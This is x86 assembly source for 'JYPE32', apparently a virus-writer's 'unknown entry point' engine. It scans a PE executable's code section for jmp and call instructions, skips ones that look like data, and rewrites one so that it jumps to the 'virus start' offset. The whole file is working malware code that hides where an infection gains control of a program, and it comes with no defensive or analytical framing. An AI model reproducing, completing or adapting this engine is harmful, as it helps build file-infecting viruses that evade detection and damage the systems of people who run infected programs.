;=============================================================================
;LAME LAME LAME LAME LAME LAME LAME LAME LAME LAME LAME LAME LAME LAME LAME  
;=============================================================================
;JYPE32
;    Just Unknown Entry Point Engine 32bits
;
;Input as c calling convercion(all values a DWORDs):
;
;CreateUEP(d,c,b,a)
;
;a-Virtual offset of begin of code section(in PE)
;b-Offset of virus start(virtual)
;c-Size for scan
;d-Offset of section dump


CreateUEP  proc
        pushad

        mov esi,[esp+9*4]              ;section dump
        mov ecx,[esp+10*4]             ;size of section dump

        xor edi,edi
        xor ebx,ebx
_find_command:

        lodsb
        inc edi                        ;incriminate counter

        cmp al,0e9h                    ;jmp  xxxx
        je _replace

        cmp al,0e8h                    ;call xxxx
        je _replace

_find_command_next:

        cmp edi,ecx
        jna _find_command

Uep_error:
				       ;no finded:(
        mov 4 ptr [esp+7*4],-1         ;eax=-1 
        popad
        ret 16

_replace:
;----------------------------------------------------------
        xor eax,eax                             ;Data part?

        cmp edi,9
        jb  _foward 

        cmp [esi-9],0
        jne _foward

        cmp [esi-5],0
        jne _foward
        inc eax
_foward:
        cmp [esi],0
        jne _result 

        cmp [esi+4],0
        jne _result 
        inc eax
_result:
        cmp eax,2  
        je _find_command_next

;----------------------------------------------------------
        mov cl,8
        mov eax,[esi-5]                  ;eax=dword before jump/call or ?

_mov_eax_m:
        cmp eax,0
        je _mov_ok

        cmp al,00010100b                 ;adc al,i8
        je _find_command_next

        cmp al,00010101b                 ;adc ax,i16
        je _find_command_next

        cmp al,10000011b                 ;adc r16/i32,18
        je _find_command_next

        cmp al,00000100b                 ;add al,i8
        je _find_command_next

        cmp al,00000101b                 ;add ax,i16
        je _find_command_next

        cmp al,00011100b                 ;sbb al,i8
        je _find_command_next

        cmp al,00011101b                 ;sbb ax,i16
        je _find_command_next

        cmp al,00100100b                 ;and al,i8
        je _find_command_next

        cmp al,00100101b                 ;and ax,i16/and eax,i32
        je _find_command_next

        cmp al,00001100b                 ;or al,i8
        je _find_command_next

        cmp al,00001101b                 ;or ax,i16/or eax,i32 
        je _find_command_next

;---------------------------------------

        and al,11111110b

        cmp al,11000110b                 ;mov m8/m16/m32,eax/ax/al
        je _find_command_next

        cmp al,10001010b                 ;mov r8/r16/r32,m8/16/m32
        je _find_command_next

        cmp al,10001000b                 ;mov m8/16/m32,r8/r16/r32
        je _find_command_next

        cmp al,00010010b                 ;adc r8/r16/r32,m8/16/m32
        je _find_command_next

        cmp al,00010000b                 ;adc m8/16/m32,r8/r16/r32
        je _find_command_next

        cmp al,00000010b                 ;add r8/r16/r32,m8/16/m32
        je _find_command_next

        cmp al,00000000b                 ;add m8/16/m32,r8/r16/r32
        je _find_command_next

        cmp al,00011010b                 ;sbb r8/r16/r32,m8/16/m32
        je _find_command_next

        cmp al,00011000b                 ;sbb m8/16/m32,r8/r16/r32
        je _find_command_next

        cmp al,11110110b                 ;not m8/m16/m32
        je _find_command_next

        cmp al,00001010b                 ;or  r8/r16/r32,m8/16/m32
        je _find_command_next

        cmp al,00001000b                 ;or  m8/16/m32,r8/r16/r32
        je _find_command_next
;---------------------------------------

        and al,11111100b          

        cmp al,10100000b                 ;adc al/ax/eax,r8/r16/r32
        je _find_command_next

        cmp al,10000000b                 ;adc al/ax/eax,i8/i16/i32
        je _find_command_next            ;& others ;)

        shr eax,cl

        jmp _mov_eax_m

;----------------------------------------------------------
_mov_ok:

        test ebx,ebx                   ;First command? 
        jnz _mov_next

        inc ebx
        jmp _find_command

_mov_next:
        dec edi                        ;edi=va(from rva) where is jmp

        mov eax,[esp+11*4]             ;offset of virus start
        mov ebx,[esp+12*4]             ;RVA of section

        lea ecx,[ebx+edi+5]            ;jump address (VA of virus)-(RVA+edi+5)
        lea edx,[ebx+edi]              ;edx=old adress to modify
        sub eax,ecx                    

        mov ebx,[esi]                  ;ebx=old address to jump
        mov [esi],eax                  ;modify

        movzx eax,byte ptr[esi-1]      ;eax= command
        mov byte ptr[esi-1],0E9h       ;replace on jmp

        mov [esp+7*4],eax              ;eax<-:edx=command:adress
        mov [esp+5*4],ebx              ;eax:edx<-=command:adress

        mov [esp],edx                  ;edi=real va adress

        popad
        ret 16
CreateUEP endp
;=============================================================================
